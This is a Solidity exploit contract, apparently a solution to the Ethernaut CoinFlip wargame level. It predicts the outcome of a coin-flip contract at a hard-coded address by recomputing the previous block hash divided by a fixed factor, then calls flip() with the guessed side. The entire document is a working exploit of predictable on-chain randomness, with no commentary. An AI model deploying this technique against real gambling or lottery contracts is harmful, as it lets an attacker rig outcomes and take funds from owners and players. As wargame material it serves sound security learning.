pragma solidity ^0.8.4;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract GuessOutcome {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip cf;

    function callContract() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        cf = ICoinFlip(0xE7A98C3D7f70fC06D084B44EBCd8b51fA3E35d84);
        cf.flip(side);
    }
}
